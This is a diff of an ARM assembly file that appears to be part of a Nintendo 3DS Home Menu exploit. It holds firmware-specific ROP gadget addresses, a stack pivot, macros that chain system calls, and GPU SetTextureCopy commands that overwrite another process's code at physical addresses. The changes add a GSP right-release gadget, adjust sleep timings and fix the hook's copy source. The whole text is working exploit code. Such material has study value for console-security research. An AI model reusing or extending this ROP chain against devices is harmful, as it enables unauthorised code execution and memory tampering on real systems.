@@ -10,11 +10,13 @@ MENU_STACK_PIVOT equ 0x00100fdc ; our stack pivot (found by yellows8) : ldmdavc 
 MENU_NOP equ 0x001575F0 ; pop {pc}
 MENU_NSS_REBOOT equ 0x00139874 ; ends in "add sp, sp, #0xc ; ldmfd sp!, {r4,r5,pc}"
 MENU_NSS_HANDLE equ 0x002F0F98
+MENU_GSPGPU_HANDLE equ 0x002FDED8
 MENU_PAD equ 0x1000001C
 MENU_KEYCOMBO equ 0x00000008 ; START
 MENU_SLEEP equ 0x0012E64C
 
 MENU_NSS_LAUNCHTITLE equ 0x0020E640 ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
+MENU_GSPGPU_RELEASERIGHT equ 0x0013148C ; r0 : handle addr
 MENU_GSPGPU_FLUSHDATACACHE equ 0x0014D55C ; r0 : address, r1 : size
 MENU_GSPGPU_GXTRYENQUEUE equ 0x001F5F10 ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
 MENU_GSPGPU_WRITEHWREG equ 0x0014D884 ; r0 : gpu reg offset, r1 : data ptr, r2 : size
@@ -59,6 +61,13 @@ SNS_CODE_OFFSET equ 0x0001D300
 		.word 0xDEADBABE ; r5 (garbage)
 		.word 0xDEADBABE ; r6 (garbage)
 	.word MENU_MEMCPY
+.endmacro
+
+.macro gsp_release_right
+	set_lr MENU_NOP
+	.word 0x001575ac ; pop {r0, pc}
+		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
+	.word MENU_GSPGPU_RELEASERIGHT
 .endmacro
 
 .macro flush_dcache,addr,size
@@ -134,13 +143,19 @@ SNS_CODE_OFFSET equ 0x0001D300
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppCode - object
 
+		; sleep for a bit
+			sleep 500*1000*1000, 0x00000000
+
+		; release gsp rights
+			gsp_release_right
+
 		; sleep for ever and ever
 			sleep 0xffffffff, 0x0fffffff
 
-		; infinite loop just in case
-			infloop
+		; ; infinite loop just in case
+		; 	infloop
 
-		;crash
+		; crash
 			.word 0xDEADBABE
 
 	; copy hook code over safe ns .text
@@ -167,7 +182,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 
 	gxCommandAppHook:
 		.word 0x00000004 ; command header (SetTextureCopy)
-		.word MENU_OBJECT_LOC + appCode - object ; source address
+		.word MENU_OBJECT_LOC + appHook - object ; source address
 		.word 0x37704be0 ; destination address (PA  for 0x00104be0)
 		.word 0x00000200 ; size
 		.word 0xFFFFFFFF ; dim in
@@ -179,7 +194,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 		.word 0x00000004 ; command header (SetTextureCopy)
 		.word MENU_OBJECT_LOC + appCode - object ; source address
 		.word 0x37800000 ; destination address (PA  for 0x00200000)
-		.word 0x00001000 ; size
+		.word 0x00010000 ; size
 		.word 0xFFFFFFFF ; dim in
 		.word 0xFFFFFFFF ; dim out
 		.word 0x00000008 ; flags
@@ -221,7 +236,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 
 	appHook:
 		.arm
-			ldr r0, =100*1000*1000 ; 100ms
+			ldr r0, =1000*1000*1000 ; 1000ms
 			ldr r1, =0x00000000
 			.word 0xef00000a ; svcSleepThread
 			ldr r2, =0x00100000 + 0x00100000
